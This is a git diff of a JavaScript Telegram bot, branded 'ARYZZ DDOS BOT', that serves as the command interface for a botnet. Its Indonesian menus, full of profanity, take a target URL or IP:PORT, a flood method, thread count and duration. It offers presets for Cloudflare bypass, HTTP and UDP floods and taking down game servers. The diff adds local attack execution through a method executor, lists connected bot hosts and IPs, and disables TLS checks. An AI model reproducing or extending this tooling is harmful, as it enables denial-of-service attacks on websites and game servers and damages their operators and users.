@@ -2,6 +2,8 @@ import { Telegraf, Markup } from 'telegraf';
 import { message } from 'telegraf/filters';
 import axios from 'axios';
 import { logger } from '../utils/logger.js';
+import { methodExecutor } from '../c2/method-executor.js';
+import crypto from 'crypto';
 
 export class TelegramBotInline {
     constructor(token, adminIds, config) {
@@ -89,13 +91,21 @@ export class TelegramBotInline {
         // Start command
         this.bot.start((ctx) => {
             if (!this.isAdmin(ctx.from.id)) {
-                return ctx.reply('❌ SIAPA LU ANJIR? GAK PUNYA AKSES BEGO!');
+                return ctx.reply('❌ NGAPAIN KONTOL? LU BUKAN ADMIN ANJING!');
             }
 
             ctx.reply(
-                `🔥 *ARYZZ C2 BOT - VERSI BUTTON* 🔥\n\n` +
-                `Woy ${ctx.from.first_name}, udah siap ngancurin target? 😈\n\n` +
-                `Pilih menu di bawah ya bro!`,
+                `╔═══════════════════════════════╗\n` +
+                `║   🔥 *ARYZZ DDOS BOT* 🔥   ║\n` +
+                `╚═══════════════════════════════╝\n\n` +
+                `Eh *${ctx.from.first_name}* udah dateng nih!\n` +
+                `Bot DDoS paling gacor se-Indonesia 🔥\n\n` +
+                `⚡ *Status:* Siap hajar target lu\n` +
+                `🤖 *Versi:* 4.0 Premium Edition\n` +
+                `🎯 *Methods:* 36+ cara buat down in target\n\n` +
+                `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                `💡 *Pencet menu dibawah buat mulai ngancurin!*\n` +
+                `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
                 { parse_mode: 'Markdown', ...this.mainMenu() }
             );
         });
@@ -109,11 +119,12 @@ export class TelegramBotInline {
             
             ctx.reply(
                 '🎯 *ATTACK BIASA*\n\n' +
-                'Kirim target lu (URL atau IP:PORT):\n\n' +
+                'Kirim target yang mau lu hajar:\n\n' +
                 'Contoh:\n' +
                 '• https://target.com\n' +
                 '• 1.2.3.4:80\n' +
-                '• mc.server.com:25565',
+                '• mc.server.com:25565\n\n' +
+                'Cepetan kirim kontol!',
                 { parse_mode: 'Markdown' }
             );
         });
@@ -125,9 +136,10 @@ export class TelegramBotInline {
             this.userSessions.set(ctx.from.id, session);
             
             ctx.reply(
-                '🔥🔥🔥 *C2 DISTRIBUTED ATTACK* 🔥🔥🔥\n\n' +
-                'Attack bakal distributed ke SEMUA bot!\n\n' +
-                'Kirim target lu:',
+                '🔥🔥🔥 *C2 ATTACK GACOR* 🔥🔥🔥\n\n' +
+                'Ini attack paling brutal cok!\n' +
+                'Bakal pake semua power bot gw\n\n' +
+                'Kirim target yang mau lu banting:',
                 { parse_mode: 'Markdown' }
             );
         });
@@ -136,8 +148,9 @@ export class TelegramBotInline {
             if (!this.isAdmin(ctx.from.id)) return;
             
             ctx.reply(
-                '🎯 *COMBO ATTACK*\n\n' +
-                'Pilih preset atau custom?',
+                '🎯 *COMBO ATTACK BRUTAL*\n\n' +
+                'Mau pake preset atau custom sendiri?\n' +
+                'Combo attack = hajar pake banyak method sekaligus!',
                 this.quickPresets()
             );
         });
@@ -158,9 +171,10 @@ export class TelegramBotInline {
             if (!this.isAdmin(ctx.from.id)) return;
             
             ctx.reply(
-                '📋 *PILIH LAYER*\n\n' +
-                'Layer 7: HTTP/HTTPS attacks\n' +
-                'Layer 4: TCP/UDP attacks',
+                '📋 *PILIH LAYER ATTACK*\n\n' +
+                'Layer 7: Buat hajar website (HTTP/HTTPS)\n' +
+                'Layer 4: Buat hajar server/game (TCP/UDP)\n\n' +
+                'Pilih yang mana kontol?',
                 { parse_mode: 'Markdown', ...this.layerMenu() }
             );
         });
@@ -170,10 +184,11 @@ export class TelegramBotInline {
             
             ctx.reply(
                 '⚠️ *STOP SEMUA ATTACK?*\n\n' +
-                'Lu yakin mau stop semua attack yang lagi jalan?',
+                'Serius mau stop? Padahal lagi asik nih hajar target\n' +
+                'Lu yakin bangsat?',
                 Markup.inlineKeyboard([
-                    [Markup.button.callback('✅ Ya, Stop!', 'confirm_stop')],
-                    [Markup.button.callback('❌ Batal', 'back_main')]
+                    [Markup.button.callback('✅ Iya stop aja', 'confirm_stop')],
+                    [Markup.button.callback('❌ Kagak jadi', 'back_main')]
                 ])
             );
         });
@@ -188,9 +203,10 @@ export class TelegramBotInline {
 
         this.bot.action('back_layer', (ctx) => {
             ctx.editMessageText(
-                '📋 *PILIH LAYER*\n\n' +
-                'Layer 7: HTTP/HTTPS attacks\n' +
-                'Layer 4: TCP/UDP attacks',
+                '📋 *PILIH LAYER ATTACK*\n\n' +
+                'Layer 7: Buat hajar website\n' +
+                'Layer 4: Buat hajar server/game\n\n' +
+                'Mau yang mana?',
                 { parse_mode: 'Markdown', ...this.layerMenu() }
             );
         });
@@ -198,15 +214,16 @@ export class TelegramBotInline {
         this.bot.action('layer_7', (ctx) => {
             ctx.editMessageText(
                 '🌐 *LAYER 7 METHODS*\n\n' +
-                'Pilih method yang mau dipake:',
+                'Pilih method buat hajar website:\n' +
+                'Ada 20+ method brutal nih!',
                 { parse_mode: 'Markdown', ...this.layer7MethodsPage1() }
             );
         });
 
         this.bot.action('layer7_page2', (ctx) => {
             ctx.editMessageText(
-                '🌐 *LAYER 7 METHODS (Page 2)*\n\n' +
-                'Pilih method yang mau dipake:',
+                '🌐 *LAYER 7 METHODS (Halaman 2)*\n\n' +
+                'Masih banyak lagi method nya cok!',
                 { parse_mode: 'Markdown', ...this.layer7MethodsPage2() }
             );
         });
@@ -222,7 +239,8 @@ export class TelegramBotInline {
         this.bot.action('layer_4', (ctx) => {
             ctx.editMessageText(
                 '🔌 *LAYER 4 METHODS*\n\n' +
-                'Pilih method yang mau dipake:',
+                'Method buat hajar server/game:\n' +
+                'Cocok buat down in server Minecraft, FiveM, dll',
                 { parse_mode: 'Markdown', ...this.layer4Methods() }
             );
         });
@@ -239,16 +257,17 @@ export class TelegramBotInline {
                 
                 ctx.editMessageText(
                     `✅ Method: *${method}*\n\n` +
-                    `Berapa threads yang mau dipake?\n\n` +
-                    `Recommended:\n` +
-                    `• Light: 100-500\n` +
-                    `• Medium: 500-2000\n` +
-                    `• Heavy: 2000-10000\n\n` +
-                    `Kirim angka nya:`,
+                    `Berapa threads yang mau lu pake?\n` +
+                    `Makin banyak makin kenceng hajarnya!\n\n` +
+                    `Rekomendasi:\n` +
+                    `• Ringan: 100-500\n` +
+                    `• Sedang: 500-2000\n` +
+                    `• Brutal: 2000-10000\n\n` +
+                    `Kirim angka nya kontol:`,
                     { parse_mode: 'Markdown' }
                 );
             } else {
-                ctx.answerCbQuery('Mulai dari menu utama dulu bro!');
+                ctx.answerCbQuery('Mulai dari menu utama dulu anjing!');
             }
         });
 
@@ -267,10 +286,11 @@ export class TelegramBotInline {
             
             ctx.editMessageText(
                 '🔥 *CLOUDFLARE BYPASS PRESET*\n\n' +
+                'Preset khusus buat tembus Cloudflare!\n\n' +
                 'Methods: HTTP2-CF, CFB, BYPASS\n' +
                 'Threads: 5000\n' +
-                'Duration: 300s\n\n' +
-                'Kirim target lu:',
+                'Durasi: 300 detik\n\n' +
+                'Kirim target yang mau lu hajar:',
                 { parse_mode: 'Markdown' }
             );
         });
@@ -289,10 +309,11 @@ export class TelegramBotInline {
             
             ctx.editMessageText(
                 '⚡ *HTTP FLOOD PRESET*\n\n' +
+                'Banjir request HTTP ke target!\n\n' +
                 'Methods: GET, POST, HTTP2, HTTP3\n' +
                 'Threads: 5000\n' +
-                'Duration: 300s\n\n' +
-                'Kirim target lu:',
+                'Durasi: 300 detik\n\n' +
+                'Kirim target yang mau lu banting:',
                 { parse_mode: 'Markdown' }
             );
         });
@@ -311,10 +332,11 @@ export class TelegramBotInline {
             
             ctx.editMessageText(
                 '💣 *UDP FLOOD PRESET*\n\n' +
+                'Banjir UDP paling brutal!\n\n' +
                 'Method: UDP\n' +
                 'Threads: 10000\n' +
-                'Duration: 300s\n\n' +
-                'Kirim target (IP:PORT):',
+                'Durasi: 300 detik\n\n' +
+                'Kirim target (IP:PORT) nya kontol:',
                 { parse_mode: 'Markdown' }
             );
         });
@@ -333,10 +355,11 @@ export class TelegramBotInline {
             
             ctx.editMessageText(
                 '🎮 *GAME SERVER PRESET*\n\n' +
+                'Khusus buat down in server game!\n\n' +
                 'Methods: MINECRAFT, VSE, TS3\n' +
                 'Threads: 5000\n' +
-                'Duration: 300s\n\n' +
-                'Kirim target (IP:PORT):',
+                'Durasi: 300 detik\n\n' +
+                'Kirim IP:PORT server yang mau lu hajar:',
                 { parse_mode: 'Markdown' }
             );
         });
@@ -355,10 +378,11 @@ export class TelegramBotInline {
             
             ctx.editMessageText(
                 '🚀 *ULTIMATE PRESET*\n\n' +
+                'Preset paling gila! Pake semua method!\n\n' +
                 'Methods: GET, POST, HTTP2, HTTP3, CFB, BYPASS, ULTIMATE\n' +
                 'Threads: 10000\n' +
-                'Duration: 300s\n\n' +
-                'Kirim target lu:',
+                'Durasi: 300 detik\n\n' +
+                'Kirim target yang mau lu ancurin total:',
                 { parse_mode: 'Markdown' }
             );
         });
@@ -366,14 +390,15 @@ export class TelegramBotInline {
         this.bot.action('confirm_stop', async (ctx) => {
             // TODO: Implement stop all attacks
             ctx.editMessageText(
-                '✅ *SEMUA ATTACK DISTOP!*\n\n' +
-                'Semua attack yang lagi jalan udah distop.',
+                '✅ *ATTACK UDAH DISTOP SEMUA!*\n\n' +
+                'Oke gw udah stop semua attack yang lagi jalan.\n' +
+                'Target nya selamat... untuk sekarang 😈',
                 { parse_mode: 'Markdown' }
             );
         });
 
         // Text message handler (for user input)
-        this.bot.on(message('text'), async (ctx) => {
+        this.bot.on('text', async (ctx) => {
             if (!this.isAdmin(ctx.from.id)) return;
             
             const session = this.userSessions.get(ctx.from.id);
@@ -403,7 +428,7 @@ export class TelegramBotInline {
             } else if (session.step === 'threads') {
                 const threads = parseInt(text);
                 if (isNaN(threads) || threads < 1) {
-                    return ctx.reply('❌ Threads harus angka yang valid bro!');
+                    return ctx.reply('❌ Threads harus angka kontol! Jangan asal kirim!');
                 }
                 
                 session.threads = threads;
@@ -412,18 +437,19 @@ export class TelegramBotInline {
                 
                 ctx.reply(
                     `✅ Threads: *${threads}*\n\n` +
-                    `Berapa lama attack nya? (detik)\n\n` +
-                    `Recommended:\n` +
-                    `• Short: 60-120s\n` +
-                    `• Medium: 120-300s\n` +
-                    `• Long: 300-600s\n\n` +
-                    `Kirim angka nya:`,
+                    `Berapa lama mau hajar target? (detik)\n` +
+                    `Makin lama makin sakit!\n\n` +
+                    `Rekomendasi:\n` +
+                    `• Cepet: 60-120 detik\n` +
+                    `• Sedang: 120-300 detik\n` +
+                    `• Lama: 300-600 detik\n\n` +
+                    `Kirim angka durasi nya:`,
                     { parse_mode: 'Markdown' }
                 );
             } else if (session.step === 'duration') {
                 const duration = parseInt(text);
                 if (isNaN(duration) || duration < 1) {
-                    return ctx.reply('❌ Duration harus angka yang valid bro!');
+                    return ctx.reply('❌ Duration harus angka bangsat! Jangan asal!');
                 }
                 
                 session.duration = duration;
@@ -445,56 +471,164 @@ export class TelegramBotInline {
         const { target, method, threads, duration, rpc } = session;
         
         ctx.reply(
-            `🔥🔥🔥 *C2 DISTRIBUTED ATTACK!* 🔥🔥🔥\n\n` +
+            `🔥🔥🔥 *SIAP-SIAP HAJAR!* 🔥🔥🔥\n\n` +
             `🎯 Target: \`${target}\`\n` +
             `⚡ Method: *${method}*\n` +
             `🧵 Threads: *${threads}*\n` +
-            `⏱ Duration: *${duration}s*\n` +
+            `⏱ Durasi: *${duration} detik*\n` +
             `🔄 RPC: *${rpc}*\n\n` +
-            `💣 LAUNCHING KE SEMUA BOT... 💣`,
+            `💣 LAGI NYIAPIN ATTACK... 💣`,
             { parse_mode: 'Markdown' }
         );
 
+        // Try C2 server first, if fails execute locally
         const c2Url = this.config.c2?.url || 'http://localhost:8080';
         const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';
+        const useLocalExecution = this.config.c2?.useLocalExecution !== false; // Default true
 
         try {
-            const https = await import('https');
-            const response = await axios.post(
-                `${c2Url}/api/attack/start`,
-                { target, method, threads, duration, rpc },
-                {
-                    headers: {
-                        'X-API-Key': apiKey,
-                        'Content-Type': 'application/json'
-                    },
-                    timeout: 10000,
-                    httpsAgent: new https.Agent({
-                        rejectUnauthorized: false
-                    })
-                }
-            );
-
-            if (response.data.success) {
-                ctx.reply(
-                    `✅ *ATTACK LAUNCHED!* ✅\n\n` +
-                    `🆔 Attack ID: \`${response.data.attack.id}\`\n` +
-                    `🔥 SEMUA BOT UDAH MULAI NGHAJAR! 🔥`,
-                    { parse_mode: 'Markdown', ...this.mainMenu() }
+            // Try C2 server if configured
+            if (!useLocalExecution) {
+                const https = await import('https');
+                const response = await axios.post(
+                    `${c2Url}/api/attack/start`,
+                    { target, method, threads, duration, rpc },
+                    {
+                        headers: {
+                            'X-API-Key': apiKey,
+                            'Content-Type': 'application/json'
+                        },
+                        timeout: 5000,
+                        httpsAgent: new https.Agent({
+                            rejectUnauthorized: false
+                        })
+                    }
                 );
-            } else {
-                ctx.reply(`❌ *GAGAL LAUNCH!* ${response.data.error}`, { parse_mode: 'Markdown' });
+
+                if (response.data.success) {
+                    ctx.reply(
+                        `✅ *ATTACK UDAH JALAN VIA C2!* ✅\n\n` +
+                        `🆔 Attack ID: \`${response.data.attack.id}\`\n` +
+                        `🔥 SEMUA BOT GW LAGI HAJAR TARGET LU! 🔥\n\n` +
+                        `Target nya bakal nangis nih 😂`,
+                        { parse_mode: 'Markdown', ...this.mainMenu() }
+                    );
+                    return;
+                }
             }
         } catch (error) {
-            ctx.reply(`❌ *ERROR ANJIR!* ${error.message}`, { parse_mode: 'Markdown' });
+            logger.warning(`C2 server not available, executing locally: ${error.message}`);
+        }
+
+        // Execute locally using method executor
+        try {
+            const attackId = crypto.randomUUID();
+            const methods = method.split(',').map(m => m.trim());
+            
+            logger.info(`🔥 Executing attack locally: ${target} (${method})`);
+            logger.info(`   Threads: ${threads}, Duration: ${duration}s, RPC: ${rpc}`);
+            
+            // Load user agents and referers
+            const userAgents = [];
+            const referers = [];
+            
+            if (methods.length > 1) {
+                // Multiple methods - combo attack
+                methodExecutor.executeCombo({
+                    attackId,
+                    target,
+                    methods,
+                    threads,
+                    duration,
+                    rpc,
+                    userAgents,
+                    referers,
+                    proxies: null,
+                    onProgress: (data) => {
+                        logger.debug(`Attack progress: ${data.elapsed}s elapsed`);
+                    },
+                    onComplete: (data) => {
+                        ctx.reply(
+                            `✅ *ATTACK KELAR BANGSAT!* ✅\n\n` +
+                            `🎯 Target: \`${target}\`\n` +
+                            `⚡ Methods: ${methods.join(', ')}\n` +
+                            `⏱ Durasi: ${duration} detik\n\n` +
+                            `📊 *HASIL:*\n` +
+                            `Sukses: ${data.results.filter(r => r.success).length}/${methods.length} methods\n\n` +
+                            `Target nya udah babak belur cok! 😈`,
+                            { parse_mode: 'Markdown', ...this.mainMenu() }
+                        );
+                    }
+                }).catch(err => {
+                    logger.error(`Combo attack error: ${err.message}`);
+                });
+            } else {
+                // Single method
+                methodExecutor.executeMethod({
+                    attackId,
+                    target,
+                    method: methods[0],
+                    threads,
+                    duration,
+                    rpc,
+                    userAgents,
+                    referers,
+                    proxies: null,
+                    onProgress: (data) => {
+                        logger.debug(`Attack progress: ${data.elapsed}s elapsed`);
+                    },
+                    onComplete: (data) => {
+                        ctx.reply(
+                            `✅ *ATTACK SELESAI KONTOL!* ✅\n\n` +
+                            `🎯 Target: \`${target}\`\n` +
+                            `⚡ Method: ${methods[0]}\n` +
+                            `⏱ Durasi: ${duration} detik\n\n` +
+                            `📊 *STATISTIK:*\n` +
+                            `Total Request: ${data.stats?.totalRequests || 0}\n` +
+                            `Sukses: ${data.stats?.successfulRequests || 0}\n` +
+                            `Gagal: ${data.stats?.failedRequests || 0}\n\n` +
+                            `Target nya udah down belum? 😂`,
+                            { parse_mode: 'Markdown', ...this.mainMenu() }
+                        );
+                    },
+                    onError: (data) => {
+                        ctx.reply(
+                            `❌ *ATTACK ERROR ANJING!* ❌\n\n` +
+                            `Ada yang salah nih: ${data.error}\n\n` +
+                            `Coba lagi kontol!`,
+                            { parse_mode: 'Markdown', ...this.mainMenu() }
+                        );
+                    }
+                }).catch(err => {
+                    logger.error(`Attack error: ${err.message}`);
+                });
+            }
+
+            ctx.reply(
+                `✅ *ATTACK UDAH JALAN BANGSAT!* ✅\n\n` +
+                `🆔 Attack ID: \`${attackId}\`\n` +
+                `🔥 BOT GW LAGI HAJAR TARGET LU! 🔥\n\n` +
+                `⏰ Bakal kelar dalam ${duration} detik\n` +
+                `Tunggu aja target nya down 😈`,
+                { parse_mode: 'Markdown', ...this.mainMenu() }
+            );
+
+        } catch (error) {
+            logger.error(`Failed to execute attack: ${error.message}`);
+            ctx.reply(
+                `❌ *ERROR KONTOL!* ❌\n\n` +
+                `Ada yang error nih: ${error.message}\n\n` +
+                `Coba lagi atau ganti method!`,
+                { parse_mode: 'Markdown', ...this.mainMenu() }
+            );
         }
     }
 
     async launchSingleAttack(ctx, session) {
         ctx.reply(
-            `🔥 *ATTACK STARTED!* 🔥\n\n` +
-            `Attack biasa belum implemented.\n` +
-            `Pake C2 Attack aja bro!`,
+            `🔥 *ATTACK BIASA BELUM JALAN!* 🔥\n\n` +
+            `Fitur ini masih dalam pengembangan kontol!\n` +
+            `Pake C2 Attack aja, lebih gacor!`,
             { parse_mode: 'Markdown', ...this.mainMenu() }
         );
     }
@@ -513,27 +647,36 @@ export class TelegramBotInline {
                 })
             });
 
-            const stats = response.data.stats;
+            const stats = response.data.stats || {};
+            const bots = stats.bots || { total: 0, online: 0, offline: 0 };
+            const attacks = stats.attacks || { running: 0, completed: 0, total: 0 };
+            const totalRequests = stats.totalRequests || 0;
+            const successRate = stats.successRate || 0;
+
             ctx.reply(
-                `🎯 *C2 SERVER STATUS* 🎯\n\n` +
-                `🤖 *BOTS:*\n` +
-                `• Total: *${stats.bots.total}*\n` +
-                `• Online: *${stats.bots.online}* 🟢\n` +
-                `• Offline: *${stats.bots.offline}* 🔴\n\n` +
-                `⚡ *ATTACKS:*\n` +
-                `• Total: *${stats.attacks.total}*\n` +
-                `• Running: *${stats.attacks.running}* 🔥\n` +
-                `• Completed: *${stats.attacks.completed}* ✅\n\n` +
-                `📊 *REQUESTS:*\n` +
-                `• Total: *${stats.requests.total.toLocaleString()}*\n` +
-                `• Success: *${stats.requests.successful.toLocaleString()}* ✅\n\n` +
-                `💪 BOTNET LU KUAT ANJIR!`,
+                `╔═══════════════════════════════\n` +
+                `║   📊 *STATUS BOT GW* 📊   ║\n` +
+                `╚═══════════════════════════════\n\n` +
+                `🤖 *BOT AGENTS*\n` +
+                `├─ Total: *${bots.total}* bot\n` +
+                `├─ Online: *${bots.online}* 🟢\n` +
+                `└─ Offline: *${bots.offline}* 🔴\n\n` +
+                `⚡ *STATUS ATTACK*\n` +
+                `├─ Lagi Jalan: *${attacks.running}* 🔥\n` +
+                `├─ Udah Kelar: *${attacks.completed}* ✅\n` +
+                `└─ Total: *${attacks.total}*\n\n` +
+                `📈 *PERFORMA*\n` +
+                `├─ Total Request: *${totalRequests.toLocaleString()}*\n` +
+                `└─ Success Rate: *${successRate}%* 🎯\n\n` +
+                `────────────────────────\n` +
+                `⏰ Update terakhir: ${new Date().toLocaleTimeString('id-ID')}`,
                 { parse_mode: 'Markdown', ...this.mainMenu() }
             );
         } catch (error) {
             ctx.reply(
-                `❌ *C2 SERVER OFFLINE ATAU ERROR!*\n\n` +
-                `Error: ${error.message}`,
+                `❌ *C2 SERVER MATI KONTOL!*\n\n` +
+                `Error: ${error.message}\n\n` +
+                `Server nya lagi mati kali!`,
                 { parse_mode: 'Markdown', ...this.mainMenu() }
             );
         }
@@ -544,37 +687,58 @@ export class TelegramBotInline {
         const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';
 
         try {
+            const https = await import('https');
             const response = await axios.get(`${c2Url}/api/bots`, {
                 headers: { 'X-API-Key': apiKey },
-                timeout: 5000
+                timeout: 5000,
+                httpsAgent: new https.Agent({
+                    rejectUnauthorized: false
+                })
             });
 
             const bots = response.data.bots;
             
             if (bots.length === 0) {
-                return ctx.reply('ℹ️ Belum ada bot yang connect bro!', this.mainMenu());
+                return ctx.reply(
+                    `╔═══════════════════════════════\n` +
+                    `║   🤖 *BOT AGENTS* 🤖   ║\n` +
+                    `╚═══════════════════════════════\n\n` +
+                    `⚠️ Belum ada bot yang connect kontol!\n\n` +
+                    `💡 Cara connect bot:\n` +
+                    `\`node index.js c2-agent --c2-url YOUR_URL\`\n\n` +
+                    `Atau pake mode lokal aja, lebih simple!`,
+                    { parse_mode: 'Markdown', ...this.mainMenu() }
+                );
             }
 
-            let msg = `🤖 *DAFTAR BOT YANG CONNECT* 🤖\n\n`;
-            msg += `Total: *${bots.length}* bot(s)\n\n`;
+            let msg = `╔═══════════════════════════════╗\n`;
+            msg += `║   🤖 *CONNECTED BOTS* 🤖   ║\n`;
+            msg += `╚═══════════════════════════════╝\n\n`;
+            msg += `📊 Total: *${bots.length}* bot(s) online\n\n`;
 
             bots.slice(0, 10).forEach((bot, index) => {
                 const status = bot.status === 'online' ? '🟢' : '🔴';
                 msg += `${status} *Bot ${index + 1}*\n`;
-                msg += `• Host: ${bot.hostname}\n`;
-                msg += `• IP: ${bot.ip}\n`;
-                msg += `• OS: ${bot.os}\n\n`;
+                msg += `├─ Host: \`${bot.hostname}\`\n`;
+                msg += `├─ IP: \`${bot.ip}\`\n`;
+                msg += `└─ OS: ${bot.os}\n\n`;
             });
 
             if (bots.length > 10) {
-                msg += `\n... dan ${bots.length - 10} bot lainnya\n`;
+                msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                msg += `... dan ${bots.length - 10} bot lainnya\n\n`;
             }
 
-            msg += `\n💪 BOTNET LU SIAP TEMPUR!`;
+            msg += `💪 *BOTNET SIAP HAJAR TARGET!*`;
 
             ctx.reply(msg, { parse_mode: 'Markdown', ...this.mainMenu() });
         } catch (error) {
-            ctx.reply(`❌ *ERROR!* ${error.message}`, { parse_mode: 'Markdown', ...this.mainMenu() });
+            ctx.reply(
+                `❌ *GAK BISA CONNECT KE C2!*\n\n` +
+                `Error: ${error.message}\n\n` +
+                `Server C2 nya lagi mati kali!`,
+                { parse_mode: 'Markdown', ...this.mainMenu() }
+            );
         }
     }
 
